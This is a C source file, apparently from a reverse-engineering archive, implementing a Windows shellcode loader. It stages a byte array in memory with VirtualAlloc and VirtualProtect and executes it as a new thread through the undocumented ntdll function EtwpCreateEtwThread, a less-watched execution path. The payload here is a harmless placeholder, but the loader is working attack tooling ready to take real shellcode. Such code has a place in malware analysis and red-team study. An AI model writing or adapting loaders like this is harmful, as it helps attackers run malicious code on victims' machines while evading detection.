/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  EtwpCreateEtwThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define GetCurrentProcess()  ((HANDLE)(LONG_PTR) -1)

/* ========= function signatures ========= */
typedef HANDLE EtwpCreateEtwThread_t (LPVOID routine, LPVOID param);
typedef EtwpCreateEtwThread_t FAR * pEtwpCreateEtwThread;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread = NULL;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMODULE     ntdll;

    // function pointer to internal API
    pEtwpCreateEtwThread EtwpCreateEtwThread;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    EtwpCreateEtwThread  = (pEtwpCreateEtwThread) GetProcAddress(ntdll, "EtwpCreateEtwThread");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // execution
        h_thread = EtwpCreateEtwThread (runtime, NULL);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}